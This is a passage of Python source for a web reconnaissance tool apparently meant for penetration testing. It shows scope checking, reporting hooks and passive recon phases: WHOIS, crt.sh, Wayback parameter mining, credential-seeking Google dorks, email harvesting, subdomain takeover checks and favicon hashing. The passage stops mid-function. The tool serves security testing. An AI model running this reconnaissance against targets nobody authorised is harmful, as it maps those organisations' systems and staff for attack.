#!/usr/bin/env python3
"""
WebRecon v3.0 — Comprehensive Web Application Enumeration Tool
Changelog vs v2:
  Bug fixes:
    - phase_default_creds success logic rewritten (was boolean spaghetti)
    - _takeover_fingerprints now uses make_session (honours proxy/UA/timeout)
    - ScopeChecker: IPv6 support + resolved-IP scope check for domain targets
    - XXE: parameter-entity blind payload, SVG/SOAP content-type variants
    - sanitise() loosened (allows host:port)
    - Google dorks API count configurable
  New features:
    - Nuclei integration (CVE/misconfig templates)
    - Authenticated scanning (--cookie, --header, --auth-check-url)
    - Crawler (katana) → feeds URLs/params into later phases
    - Parameter discovery (Arjun)
    - SSRF probe (OOB-based, per-param injection)
    - SSTI detection (Jinja2/Twig/FreeMarker/ERB)
    - CRLF injection probe
    - Host header injection probe
    - JWT deep analysis (alg:none, weak secret, key confusion, kid injection)
    - Tech-specific playbooks (WordPress/Drupal/Joomla/Spring/Tomcat/Laravel)
    - Favicon hash (mmh3 for Shodan pivoting)
    - Wayback parameter extraction
    - HTML report output
    - PentestDB integration (POST findings to self-hosted DB)
    - Adaptive rate limiting (back off on 429/503)
    - Webhook notifications (Discord/Slack compatible)
    - Scan profiles: recon | active | full | stealth
"""

import os
import re
import sys
import json
import time
import shutil
import socket
import hashlib
import base64
import subprocess
import ipaddress
import threading
from datetime import datetime
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional, List, Dict, Tuple, Set
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, parse_qs
from collections import Counter

# ── Dependency checks ────────────────────────────────────────────────────────
_MISSING = []
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    _MISSING.append("requests")

try:
    from colorama import Fore, Style, init as _cinit
    _cinit(autoreset=True)
except ImportError:
    _MISSING.append("colorama")
    class Fore:
        RED=GREEN=YELLOW=BLUE=CYAN=MAGENTA=WHITE=""
    class Style:
        RESET_ALL=BRIGHT=""

try:
    from tqdm import tqdm
except ImportError:
    _MISSING.append("tqdm")

# Optional deps — degrade gracefully
try:
    import mmh3
    _HAS_MMH3 = True
except ImportError:
    _HAS_MMH3 = False

if _MISSING:
    print(f"[!] Missing required packages: pip install {' '.join(_MISSING)}")
    sys.exit(1)

# ── Constants ─────────────────────────────────────────────────────────────────
VERSION        = "3.0.0"
DEFAULT_UA     = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/120.0.0.0 Safari/537.36")
DEFAULT_TIMEOUT = 10

# ═════════════════════════════════════════════════════════════════════════════
# DATA STRUCTURES
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    INFO     = "INFO"
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

class TargetType(Enum):
    IP     = "ip"
    DOMAIN = "domain"

class ScanProfile(str, Enum):
    RECON   = "recon"    # Passive only — no active probes
    ACTIVE  = "active"   # Passive + active recon + tech (no vuln scan)
    FULL    = "full"     # Everything
    STEALTH = "stealth"  # Full but throttled, no intrusive tools

@dataclass
class Finding:
    title:          str
    severity:       Severity
    description:    str
    evidence:       str = ""
    recommendation: str = ""
    phase:          str = ""
    timestamp:      str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ScanConfig:
    target:          str
    target_type:     TargetType
    base_url:        str
    output_prefix:   str
    proxy:           Optional[str]  = None
    user_agent:      str            = DEFAULT_UA
    timeout:         int            = DEFAULT_TIMEOUT
    oob_url:         Optional[str]  = None
    scope_file:      Optional[str]  = None
    auto:            bool           = False
    rate:            int            = 50
    delay:           float          = 0.0
    full_ports:      bool           = False
    google_api_key:  Optional[str]  = None
    google_cx:       Optional[str]  = None
    google_dork_count: int          = 5
    diff_file:       Optional[str]  = None
    threads:         int            = 5
    verbose:         bool           = False
    # Auth
    cookie:          Optional[str]  = None
    extra_headers:   List[str]      = field(default_factory=list)
    auth_check_url:  Optional[str]  = None
    auth_check_text: Optional[str]  = None
    # Integrations
    webhook_url:     Optional[str]  = None
    webhook_threshold: Severity     = Severity.HIGH
    pentestdb_url:   Optional[str]  = None
    pentestdb_token: Optional[str]  = None
    # Scan control
    profile:         ScanProfile    = ScanProfile.FULL
    no_intrusive:    bool           = False
    nuclei_severity: str            = "medium,high,critical"
    html_report:     bool           = True

# ═════════════════════════════════════════════════════════════════════════════
# ADAPTIVE RATE-LIMITED SESSION
# ═════════════════════════════════════════════════════════════════════════════

class RateLimitedSession(requests.Session):
    """Sessions share class-level backoff so the whole scan throttles together."""
    _lock              = threading.Lock()
    _consecutive_429   = 0
    _backoff_until     = 0.0
    _announced_backoff = False

    def request(self, method, url, **kwargs):
        # Respect any active backoff window
        with RateLimitedSession._lock:
            wait = RateLimitedSession._backoff_until - time.time()
        if wait > 0:
            time.sleep(min(wait, 60))

        try:
            resp = super().request(method, url, **kwargs)
        except Exception:
            raise

        if resp.status_code in (429, 503):
            with RateLimitedSession._lock:
                RateLimitedSession._consecutive_429 += 1
                backoff = min(2 ** RateLimitedSession._consecutive_429, 60)
                RateLimitedSession._backoff_until = time.time() + backoff
                if not RateLimitedSession._announced_backoff:
                    print(f"  {Fore.YELLOW}⏱ Rate limited (HTTP {resp.status_code}) "
                          f"— backing off {backoff}s")
                    RateLimitedSession._announced_backoff = True
        elif resp.status_code < 400:
            with RateLimitedSession._lock:
                if RateLimitedSession._consecutive_429 > 0:
                    RateLimitedSession._consecutive_429 = 0
                    RateLimitedSession._announced_backoff = False

        return resp

# ═════════════════════════════════════════════════════════════════════════════
# DISCOVERED STATE (crawler → param discovery → SSRF/SSTI/etc)
# ═════════════════════════════════════════════════════════════════════════════

class DiscoveredState:
    def __init__(self):
        self._lock  = threading.Lock()
        self.urls:   Set[str] = set()
        self.params: Set[str] = set()
        self.endpoints: Set[str] = set()   # (path-only, no query)

    def add_urls(self, urls):
        with self._lock:
            for u in urls:
                if not u:
                    continue
                self.urls.add(u)
                try:
                    parsed = urlparse(u)
                    if parsed.path:
                        self.endpoints.add(parsed.path)
                    if parsed.query:
                        for k in parse_qs(parsed.query).keys():
                            self.params.add(k)
                except Exception:
                    pass

    def add_params(self, params):
        with self._lock:
            self.params.update(p for p in params if p)

    def get_urls_with_params(self, limit: int = 50) -> List[str]:
        with self._lock:
            return [u for u in self.urls if '?' in u and '=' in u][:limit]

DISCOVERED = DiscoveredState()

# ═════════════════════════════════════════════════════════════════════════════
# FINDINGS STORE + HOOKS (webhook / pentestdb)
# ═════════════════════════════════════════════════════════════════════════════

_findings: List[Finding] = []
_findings_lock = threading.Lock()
_SEV_ORDER = {Severity.INFO:0, Severity.LOW:1, Severity.MEDIUM:2,
              Severity.HIGH:3, Severity.CRITICAL:4}

def add_finding(f: Finding, output_file: str, cfg: Optional[ScanConfig] = None):
    with _findings_lock:
        _findings.append(f)
    color = {
        Severity.INFO:     Fore.CYAN,
        Severity.LOW:      Fore.GREEN,
        Severity.MEDIUM:   Fore.YELLOW,
        Severity.HIGH:     Fore.RED,
        Severity.CRITICAL: Fore.MAGENTA,
    }.get(f.severity, Fore.WHITE)
    print(f"  {color}[{f.severity.value}] {f.title}")
    _log_finding_to_report(f, output_file)

    # Push to webhook / pentestdb if configured and severity warrants
    if cfg:
        try:
            if cfg.webhook_url and _SEV_ORDER[f.severity] >= _SEV_ORDER[cfg.webhook_threshold]:
                webhook_notify(f, cfg)
        except Exception as e:
            if cfg.verbose:
                print(f"  {Fore.YELLOW}⚠ webhook: {e}")
        try:
            if cfg.pentestdb_url:
                pentestdb_push(f, cfg)
        except Exception as e:
            if cfg.verbose:
                print(f"  {Fore.YELLOW}⚠ pentestdb: {e}")

def _log_finding_to_report(f: Finding, output_file: str):
    icons = {Severity.INFO:"ℹ️", Severity.LOW:"🟢",
             Severity.MEDIUM:"🟡", Severity.HIGH:"🔴", Severity.CRITICAL:"🚨"}
    icon = icons.get(f.severity, "")
    lines = [
        f"\n### {icon} [{f.severity.value}] {f.title}",
        f"**Phase:** {f.phase}  |  **Time:** {f.timestamp}\n",
        f"**Description:** {f.description}\n",
    ]
    if f.evidence:
        lines.append(f"**Evidence:**\n```\n{f.evidence[:1500]}\n```\n")
    if f.recommendation:
        lines.append(f"**Recommendation:** {f.recommendation}\n")
    lines.append("---")
    _log(output_file, '\n'.join(lines))

# ═════════════════════════════════════════════════════════════════════════════
# WEBHOOK NOTIFIER (Discord / Slack compatible)
# ═════════════════════════════════════════════════════════════════════════════

def webhook_notify(f: Finding, cfg: ScanConfig):
    """POST a finding to a Discord/Slack incoming webhook URL."""
    color_map = {Severity.INFO: 0x3498db, Severity.LOW: 0x2ecc71,
                 Severity.MEDIUM: 0xf1c40f, Severity.HIGH: 0xe67e22,
                 Severity.CRITICAL: 0xe74c3c}
    url = cfg.webhook_url
    if not url:
        return
    # Discord-style embed
    if "discord" in url.lower():
        payload = {
            "embeds": [{
                "title":       f"[{f.severity.value}] {f.title}",
                "description": f.description[:1500],
                "color":       color_map.get(f.severity, 0x95a5a6),
                "fields": [
                    {"name": "Target", "value": cfg.target, "inline": True},
                    {"name": "Phase",  "value": f.phase or "n/a", "inline": True},
                ],
                "timestamp": f.timestamp,
            }]
        }
    else:
        # Slack-style
        payload = {
            "text": f"*[{f.severity.value}]* {f.title}\n"
                    f"_Target:_ `{cfg.target}` | _Phase:_ `{f.phase}`\n"
                    f"{f.description[:1500]}"
        }
    try:
        requests.post(url, json=payload, timeout=5, verify=False,
                      proxies={"http": cfg.proxy, "https": cfg.proxy} if cfg.proxy else None)
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════════════════
# PENTESTDB PUSHER
# ═════════════════════════════════════════════════════════════════════════════

def pentestdb_push(f: Finding, cfg: ScanConfig):
    """POST finding to a self-hosted pentestdb instance.
    Expected API: POST {pentestdb_url}/api/findings with JSON body.
    Adapt endpoint path to match your deployment."""
    if not cfg.pentestdb_url:
        return
    endpoint = cfg.pentestdb_url.rstrip('/') + "/api/findings"
    payload = {
        "target":         cfg.target,
        "title":          f.title,
        "severity":       f.severity.value,
        "description":    f.description,
        "evidence":       f.evidence,
        "recommendation": f.recommendation,
        "phase":          f.phase,
        "timestamp":      f.timestamp,
        "tool":           f"WebRecon v{VERSION}",
    }
    headers = {"Content-Type": "application/json"}
    if cfg.pentestdb_token:
        headers["Authorization"] = f"Bearer {cfg.pentestdb_token}"
    try:
        requests.post(endpoint, json=payload, headers=headers,
                      timeout=10, verify=False)
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════════════════
# SCOPE ENFORCEMENT (fixed: IPv6, resolved-IP check)
# ═════════════════════════════════════════════════════════════════════════════

class ScopeChecker:
    def __init__(self, scope_file: Optional[str] = None):
        self.domains: List[str] = []
        self.cidrs:   List = []  # IPv4Network | IPv6Network
        self.enabled  = scope_file is not None
        if scope_file and os.path.exists(scope_file):
            for line in open(scope_file):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Try IPv4 then IPv6 network, fall back to domain
                try:
                    self.cidrs.append(ipaddress.IPv4Network(line, strict=False))
                    continue
                except ValueError:
                    pass
                try:
                    self.cidrs.append(ipaddress.IPv6Network(line, strict=False))
                    continue
                except ValueError:
                    pass
                self.domains.append(line.lower().lstrip('*.'))

    def check(self, target: str) -> bool:
        if not self.enabled:
            return True
        # IP literal check
        try:
            addr = ipaddress.ip_address(target)
            return any(addr in net for net in self.cidrs
                       if isinstance(net, type(ipaddress.ip_network(str(net)))) or True)
        except ValueError:
            pass
        # Domain match
        t = target.lower()
        if any(t == d or t.endswith('.' + d) for d in self.domains):
            return True
        # Resolve domain → check IP against CIDRs
        if self.cidrs:
            try:
                resolved = socket.gethostbyname(target)
                addr = ipaddress.ip_address(resolved)
                for net in self.cidrs:
                    try:
                        if addr in net:
                            return True
                    except (TypeError, ValueError):
                        continue
            except Exception:
                pass
        return False

# ═════════════════════════════════════════════════════════════════════════════
# SCAN STATE (RESUMABILITY)
# ═════════════════════════════════════════════════════════════════════════════

class ScanState:
    def __init__(self, state_file: str):
        self._file = state_file
        self._done: List[str] = []
        self._start = datetime.now().isoformat()
        if os.path.exists(state_file):
            try:
                d = json.load(open(state_file))
                self._done  = d.get("done", [])
                self._start = d.get("start", self._start)
                print(f"{Fore.YELLOW}  [RESUME] Completed phases: {', '.join(self._done) or 'none'}")
            except Exception:
                pass

    def done(self, phase: str) -> bool:
        return phase in self._done

    def mark(self, phase: str):
        if phase not in self._done:
            self._done.append(phase)
            json.dump({"done": self._done, "start": self._start,
                       "updated": datetime.now().isoformat()},
                      open(self._file, 'w'), indent=2)

    def clear(self):
        self._done = []
        if os.path.exists(self._file):
            os.remove(self._file)

# ═════════════════════════════════════════════════════════════════════════════
# OUTPUT HELPERS
# ═════════════════════════════════════════════════════════════════════════════

_log_lock = threading.Lock()

def _log(output_file: str, msg: str):
    with _log_lock:
        with open(output_file, 'a') as fh:
            fh.write(msg + '\n')

def section(title: str, output_file: str):
    print(f"\n{Fore.BLUE}{'─'*55}")
    print(f"{Fore.BLUE}  {title}")
    print(f"{Fore.BLUE}{'─'*55}")
    _log(output_file, f"\n\n---\n# {title}\n")

def save_findings(findings: List[Finding], path: str):
    with open(path, 'w') as fh:
        json.dump([asdict(f) for f in findings], fh, indent=2, default=str)

# ═════════════════════════════════════════════════════════════════════════════
# SUBPROCESS RUNNER (shell=False)
# ═════════════════════════════════════════════════════════════════════════════

def run_cmd(cmd: List[str], desc: str, output_file: str, config: ScanConfig,
            timeout: int = 300) -> Tuple[str, str, int]:
    print(f"{Fore.YELLOW}  → {desc}")
    _log(output_file, f"\n## {desc}\n**`{' '.join(cmd)}`**")
    try:
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           text=True, timeout=timeout)
        if r.stdout:
            _log(output_file, f"```\n{r.stdout.strip()}\n```")
        if r.stderr and config.verbose:
            _log(output_file, f"**stderr:**\n```\n{r.stderr.strip()}\n```")
        icon = Fore.GREEN + "✓" if r.returncode == 0 else Fore.RED + "✗"
        print(f"  {icon} {desc}")
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        msg = f"TIMEOUT after {timeout}s"
        print(f"  {Fore.RED}⏱ {desc}: {msg}")
        _log(output_file, f"> ⚠️ {msg}")
        return "", "", -1
    except FileNotFoundError:
        print(f"  {Fore.RED}✗ Not found: {cmd[0]}")
        _log(output_file, f"> ⚠️ {cmd[0]} not installed")
        return "", "", -1
    except Exception as e:
        print(f"  {Fore.RED}✗ {e}")
        _log(output_file, f"> ⚠️ {e}")
        return "", "", -1

# ═════════════════════════════════════════════════════════════════════════════
# HTTP SESSION (auth-aware, rate-limited)
# ═════════════════════════════════════════════════════════════════════════════

def make_session(config: ScanConfig) -> "requests.Session":
    s = RateLimitedSession()
    s.headers["User-Agent"] = config.user_agent
    s.verify = False
    if config.proxy:
        s.proxies = {"http": config.proxy, "https": config.proxy}
    # Authenticated session: cookies
    if config.cookie:
        for kv in config.cookie.split(';'):
            kv = kv.strip()
            if '=' in kv:
                k, v = kv.split('=', 1)
                s.cookies.set(k.strip(), v.strip())
    # Extra headers (Authorization: Bearer …, X-API-Key: …, etc.)
    if config.extra_headers:
        for h in config.extra_headers:
            if ':' in h:
                k, v = h.split(':', 1)
                s.headers[k.strip()] = v.strip()
    return s

def detect_scheme(target: str, config: ScanConfig) -> str:
    sess = make_session(config)
    for scheme in ("https", "http"):
        try:
            sess.get(f"{scheme}://{target}", timeout=config.timeout,
                     allow_redirects=False)
            print(f"{Fore.GREEN}  ✓ Scheme detected: {scheme}")
            return scheme
        except Exception:
            continue
    return "http"

def revalidate_session(cfg: ScanConfig, out: str) -> bool:
    """If auth-check-url/text configured, verify session is still authenticated."""
    if not cfg.auth_check_url or not cfg.auth_check_text:
        return True
    try:
        sess = make_session(cfg)
        r = sess.get(cfg.auth_check_url, timeout=cfg.timeout)
        if cfg.auth_check_text in r.text:
            return True
        print(f"  {Fore.RED}⚠ Auth check failed — session may have expired!")
        _log(out, f"> ⚠️ Auth check failed at {cfg.auth_check_url}")
        return False
    except Exception as e:
        print(f"  {Fore.YELLOW}⚠ Auth check error: {e}")
        return False

# ═════════════════════════════════════════════════════════════════════════════
# TOOL HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def _tool_ok(name: str, output_file: str) -> bool:
    if shutil.which(name):
        return True
    msg = f"{name} not installed — skipping"
    print(f"  {Fore.YELLOW}⚠ {msg}")
    _log(output_file, f"> ⚠️ {msg}")
    return False

def _is_root() -> bool:
    return os.geteuid() == 0

def _sudo() -> List[str]:
    return [] if _is_root() else ["sudo"]

# ═════════════════════════════════════════════════════════════════════════════
# INPUT HELPERS (loosened sanitise: allow host:port)
# ═════════════════════════════════════════════════════════════════════════════

def normalise(raw: str) -> str:
    raw = raw.strip()
    if re.match(r'^https?://', raw, re.I):
        return urlparse(raw).netloc
    return raw.rstrip('/')

def validate(target: str) -> Optional[TargetType]:
    if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', target):
        try:
            ipaddress.IPv4Address(target)
            return TargetType.IP
        except ValueError:
            return None
    if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$', target):
        return TargetType.DOMAIN
    # Allow host:port
    if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}:\d{1,5}$', target):
        return TargetType.DOMAIN
    return None

def sanitise(value: str) -> str:
    # Loosened: colon allowed (for host:port). Still blocks shell metachars.
    if re.search(r'[;&|`$<>()\\\'"{}]', value):
        raise ValueError(f"Unsafe characters in input: {value!r}")
    return value

def yes_no(prompt: str) -> bool:
    while True:
        ans = input(f"{Fore.CYAN}  {prompt} (y/n): ").strip().lower()
        if ans in ('y', 'yes'): return True
        if ans in ('n', 'no'):  return False

# ═════════════════════════════════════════════════════════════════════════════
# DIFF MODE
# ═════════════════════════════════════════════════════════════════════════════

def diff_findings(current: List[Finding], prev_file: str) -> Dict:
    if not os.path.exists(prev_file):
        return {}
    try:
        prev = {f['title'] for f in json.load(open(prev_file))}
        curr = {f.title for f in current}
        return {
            "new":       [asdict(f) for f in current if f.title not in prev],
            "resolved":  list(prev - curr),
            "unchanged": len(curr & prev),
        }
    except Exception:
        return {}

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 1 — PASSIVE RECONNAISSANCE
# ═════════════════════════════════════════════════════════════════════════════

def phase_passive_dns(target: str, tt: TargetType, cfg: ScanConfig,
                      out: str, st: ScanState, scope: ScopeChecker):
    phase = "passive_dns"
    if st.done(phase): return
    section("Passive DNS, WHOIS & ASN", out)

    run_cmd(["nslookup", target.split(':')[0]], "NSLookup", out, cfg)

    if tt == TargetType.DOMAIN and _tool_ok("dnsrecon", out):
        run_cmd(["dnsrecon", "-d", target.split(':')[0], "-t", "std"],
                "DNSRecon", out, cfg, 120)

    # WHOIS
    if shutil.which("whois"):
        stdout, _, _ = run_cmd(["whois", target.split(':')[0]], "WHOIS", out, cfg, 30)
        if stdout:
            for line in stdout.lower().splitlines():
                if "creation date" in line or "created:" in line:
                    m = re.search(r'(\d{4})', line)
                    if m and datetime.now().year - int(m.group(1)) <= 1:
                        add_finding(Finding(
                            title="Recently Registered Domain",
                            severity=Severity.MEDIUM,
                            description="Domain was registered within the last year — common for phishing or typosquatting.",
                            evidence=line.strip(),
                            recommendation="Verify domain ownership and legitimacy.",
                            phase=phase), out, cfg)

    # ASN via ipinfo.io
    try:
        lookup_ip = target.split(':')[0]
        if tt == TargetType.DOMAIN:
            try: lookup_ip = socket.gethostbyname(lookup_ip)
            except Exception: pass
        sess = make_session(cfg)
        r = sess.get(f"https://ipinfo.io/{lookup_ip}/json", timeout=cfg.timeout)
        if r.ok:
            data = r.json()
            _log(out, f"```json\n{json.dumps(data, indent=2)}\n```")
            add_finding(Finding(
                title="ASN & Network Information",
                severity=Severity.INFO,
                description=f"IP: {lookup_ip} | Org: {data.get('org','?')} | Country: {data.get('country','?')}",
                evidence=json.dumps(data, indent=2),
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> ASN lookup failed: {e}")

    # IPv6 check
    if tt == TargetType.DOMAIN:
        try:
            addrs = socket.getaddrinfo(target.split(':')[0], None, socket.AF_INET6)
            if addrs:
                add_finding(Finding(
                    title="IPv6 Address Exposed",
                    severity=Severity.INFO,
                    description=f"Target exposes IPv6: {addrs[0][4][0]}. Verify WAF/access controls cover IPv6.",
                    evidence=str(addrs[0][4][0]),
                    recommendation="Ensure security controls (WAF, monitoring) apply equally to IPv6.",
                    phase=phase), out, cfg)
        except Exception:
            pass

    st.mark(phase)


def phase_cert_transparency(target: str, tt: TargetType, cfg: ScanConfig,
                             out: str, st: ScanState):
    phase = "cert_transparency"
    if st.done(phase) or tt != TargetType.DOMAIN: return
    section("Certificate Transparency (crt.sh)", out)
    host = target.split(':')[0]
    try:
        sess = make_session(cfg)
        r = sess.get(f"https://crt.sh/?q=%.{host}&output=json", timeout=30)
        if r.ok:
            domains = sorted({
                d.strip().lstrip('*.')
                for cert in r.json()
                for d in cert.get('name_value', '').split('\n')
                if host in d
            })
            _log(out, f"Found {len(domains)} unique entries:\n```\n" + '\n'.join(domains[:200]) + "\n```")
            print(f"{Fore.GREEN}  ✓ crt.sh: {len(domains)} subdomains")
            add_finding(Finding(
                title=f"Certificate Transparency: {len(domains)} Subdomains",
                severity=Severity.INFO,
                description=f"crt.sh reveals {len(domains)} subdomains for {host}.",
                evidence='\n'.join(domains[:50]),
                recommendation="Review for forgotten or unpatched assets.",
                phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> crt.sh failed: {e}")
    st.mark(phase)


def phase_wayback(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Enhanced: extracts URL parameters for later fuzzing."""
    phase = "wayback"
    if st.done(phase): return
    section("Wayback Machine URL Mining", out)
    host = target.split(':')[0]
    try:
        sess = make_session(cfg)
        url = (f"http://web.archive.org/cdx/search/cdx?url={host}/*"
               "&output=json&fl=original&collapse=urlkey&limit=500")
        r = sess.get(url, timeout=30)
        if r.ok:
            rows = r.json()
            urls = [row[0] for row in rows[1:]] if len(rows) > 1 else []
            _log(out, f"Found {len(urls)} archived URLs\n```\n" + '\n'.join(urls[:200]) + "\n```")
            print(f"{Fore.GREEN}  ✓ Wayback: {len(urls)} URLs")

            # Feed URLs + params into shared state
            DISCOVERED.add_urls(urls)
            extracted_params = set()
            for u in urls:
                try:
                    q = urlparse(u).query
                    if q:
                        for k in parse_qs(q).keys():
                            extracted_params.add(k)
                except Exception:
                    continue
            if extracted_params:
                DISCOVERED.add_params(extracted_params)
                _log(out, f"\n## Wayback Parameters ({len(extracted_params)} unique)\n"
                          f"```\n{', '.join(sorted(extracted_params)[:100])}\n```")
                add_finding(Finding(
                    title=f"Wayback: {len(extracted_params)} Historical URL Parameters",
                    severity=Severity.INFO,
                    description=f"Extracted {len(extracted_params)} unique parameters from archived URLs — feeding into fuzzing phases.",
                    evidence=', '.join(sorted(extracted_params)[:50]),
                    recommendation="Review old parameters for dead code paths or residual functionality.",
                    phase=phase), out, cfg)

            for kw in ('admin', 'api', 'backup', 'config', 'debug', 'upload', 'test', 'dev'):
                hits = [u for u in urls if kw in u.lower()]
                if hits:
                    add_finding(Finding(
                        title=f"Wayback: Historical '{kw}' Endpoints",
                        severity=Severity.LOW,
                        description=f"{len(hits)} archived URLs contain '{kw}'.",
                        evidence='\n'.join(hits[:10]),
                        recommendation="Verify whether these endpoints still exist and are secured.",
                        phase=phase), out, cfg)
    except Exception as e:
        _log(out, f"> Wayback failed: {e}")
    st.mark(phase)


def phase_google_dorks(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "google_dorks"
    if st.done(phase): return
    section("Google Dorking", out)
    host = target.split(':')[0]
    dorks = [
        f"site:{host}",
        f"site:{host} filetype:pdf",
        f"site:{host} filetype:xls OR filetype:xlsx",
        f"site:{host} inurl:admin",
        f"site:{host} inurl:login",
        f"site:{host} inurl:config OR inurl:backup",
        f"site:{host} intext:\"error\" OR intext:\"exception\" OR intext:\"stack trace\"",
        f"site:{host} intext:\"username\" intext:\"password\"",
        f"site:{host} ext:env OR ext:git OR ext:svn",
        f"site:{host} \"index of\"",
        f"site:{host} inurl:api",
    ]
    _log(out, "## Google Dork URLs\n")
    for d in dorks:
        enc = d.replace(' ', '+')
        _log(out, f"- [{d}](https://www.google.com/search?q={enc})")

    if cfg.google_api_key and cfg.google_cx:
        sess = make_session(cfg)
        for dork in dorks[:cfg.google_dork_count]:
            try:
                resp = sess.get("https://www.googleapis.com/customsearch/v1",
                                params={"key": cfg.google_api_key, "cx": cfg.google_cx,
                                        "q": dork, "num": 10}, timeout=cfg.timeout)
                if resp.ok:
                    items = resp.json().get('items', [])
                    _log(out, f"\n### `{dork}` ({len(items)} results)")
                    for item in items:
                        _log(out, f"- [{item.get('title')}]({item.get('link')})")
                time.sleep(1)
            except Exception as e:
                _log(out, f"> API search failed: {e}")
    else:
        print(f"{Fore.CYAN}  ℹ Dork URLs generated. Add --google-api-key to automate.")
    st.mark(phase)


def phase_email_harvest(target: str, tt: TargetType, cfg: ScanConfig,
                         out: str, st: ScanState):
    phase = "email_harvest"
    if st.done(phase) or tt != TargetType.DOMAIN: return
    section("Email Harvesting (theHarvester)", out)
    if _tool_ok("theHarvester", out):
        run_cmd(["theHarvester", "-d", target.split(':')[0],
                 "-b", "bing,google,duckduckgo", "-l", "200"],
                "theHarvester", out, cfg, 180)
    st.mark(phase)


def phase_subdomain_enum(target: str, tt: TargetType, cfg: ScanConfig,
                          out: str, st: ScanState, scope: ScopeChecker):
    phase = "subdomain_enum"
    if st.done(phase) or tt != TargetType.DOMAIN:
        if tt != TargetType.DOMAIN:
            print(f"  {Fore.YELLOW}[SKIP] Subdomain enum — target is IP")
        return
    section("Subdomain Enumeration & Takeover Detection", out)

    host = target.split(':')[0]
    subdomains = []
    if _tool_ok("subfinder", out):
        stdout, _, _ = run_cmd(["subfinder", "-d", host, "-silent"],
                               "subfinder", out, cfg, 120)
        if stdout:
            subdomains = [s.strip() for s in stdout.splitlines() if s.strip()]

    # Scope-filter discovered subdomains
    if scope.enabled:
        before = len(subdomains)
        subdomains = [s for s in subdomains if scope.check(s)]
        if before != len(subdomains):
            print(f"  {Fore.YELLOW}  [SCOPE] Filtered {before - len(subdomains)} out-of-scope subdomains")

    if subdomains:
        if _tool_ok("subjack", out):
            subs_file = f"/tmp/subs_{hashlib.md5(host.encode()).hexdigest()}.txt"
            open(subs_file, 'w').write('\n'.join(subdomains))
            run_cmd(["subjack", "-w", subs_file, "-t", "50", "-timeout", "30", "-ssl"],
                    "subjack takeover scan", out, cfg, 300)
        _takeover_fingerprints(subdomains, out, phase, cfg)

    st.mark(phase)


_TAKEOVER_FP = {
    "github.io":         "There isn't a GitHub Pages site here",
    "s3.amazonaws.com":  "NoSuchBucket",
    "herokudns.com":     "No such app",
    "azurewebsites.net": "404 Web Site not found",
    "shopify.com":       "Sorry, this shop is currently unavailable",
    "fastly.net":        "Fastly error: unknown domain",
    "surge.sh":          "project not found",
    "bitbucket.io":      "Repository not found",
}

def _takeover_fingerprints(subdomains: List[str], out: str, phase: str, cfg: ScanConfig):
    """Fixed: uses make_session to honour proxy/UA/timeout config."""
    _log(out, "\n## Takeover Fingerprint Check")
    sess = make_session(cfg)
    for sub in subdomains[:50]:
        try:
            res = subprocess.run(["dig", "+short", "CNAME", sub],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, timeout=5)
            cname = res.stdout.strip()
            if not cname: continue
            for svc, fp in _TAKEOVER_FP.items():
                if svc in cname:
                    try:
                        r = sess.get(f"https://{sub}", timeout=cfg.timeout)
                        if fp.lower() in r.text.lower():
                            add_finding(Finding(
                                title=f"Subdomain Takeover: {sub}",
                                severity=Severity.HIGH,
                                description=f"{sub} → CNAME {cname} ({svc}) returns takeover fingerprint.",
                                evidence=f"CNAME: {cname}\nFingerprint: {fp}",
                                recommendation="Remove dangling DNS record or reclaim the resource.",
                                phase=phase), out, cfg)
                    except Exception:
                        pass
        except Exception:
            continue


def phase_favicon_hash(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Compute mmh3 hash of /favicon.ico for Shodan pivoting."""
    phase = "favicon_hash"
    if st.done(phase): return
    section("Favicon Hash (Shodan Pivot)", out)

    sess = make_session(cfg)
    try:
        r = sess.get(f"{cfg.base_url}/favicon.ico", timeout=cfg.timeout)
        if not r.ok or len(r.content) < 10:
            _log(out, f"> No favicon at {cfg.base_url}/favicon.ico (HTTP {r.status_code})")
            st.mark(phase); return

        sha256 = hashlib.sha256(r.content).hexdigest()
        _log(out, f"- Favicon SHA-256: `{sha256}`")
        _log(out, f"- Size: {len(r.content)} bytes")

        if _HAS_MMH3:
            # Shodan-compatible: b64-encode with \n every 76 chars, then mmh3
            b64 = base64.encodebytes(r.content).decode()
            mmh3_hash = mmh3.hash(b64)
            _log(out, f"- Favicon mmh3 (Shodan): `{mmh3_hash}`")
            _log(out, f"- Shodan query: `http.favicon.hash:{mmh3_hash}`")
            add_finding(Finding(
                title=f"Favicon Hash: {mmh3_hash}",
                severity=Severity.INFO,
                description=f"mmh3 favicon hash computed. Pivot via Shodan: http.favicon.hash:{mmh3_hash}",
                evidence=f"SHA-256: {sha256}\nmmh3: {mmh3_hash}",
                recommendation="Consider rotating favicon if leakage of related infra is a concern.",
                phase=phase), out, cfg)
        else:
